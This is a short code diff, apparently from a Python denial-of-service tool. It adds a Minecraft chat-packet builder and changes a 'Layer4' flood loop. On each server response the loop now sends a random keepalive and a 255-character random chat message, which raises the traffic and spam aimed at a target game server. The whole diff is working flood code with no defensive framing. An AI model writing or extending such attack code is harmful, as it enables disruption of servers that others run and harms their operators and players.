@@ -209,9 +209,15 @@ class Minecraft:
                               Minecraft.data(username))
 
     @staticmethod
-    def keepalive(num_id) -> bytes:
+    def keepalive(num_id: int) -> bytes:
         return Minecraft.data(Minecraft.varint(0x00),
                               Minecraft.varint(num_id))
+
+
+    @staticmethod
+    def chat(message: str) -> bytes:
+        return Minecraft.data(Minecraft.varint(0x01),
+                              Minecraft.data(message.encode()))
 
 
 # noinspection PyBroadException
@@ -382,8 +388,10 @@ class Layer4(Thread):
 
                 while s.recv(1):
                     keep = Minecraft.keepalive(randint(1000, 1234567890))
+                    chat = Minecraft.chat(ProxyTools.Random.rand_str(255))
                     s.send(keep)
-                    bytes_sent += len(keep)
+                    s.send(chat)
+                    bytes_sent += len(keep + chat)
                     REQUESTS_SENT += 1
 
         except Exception:
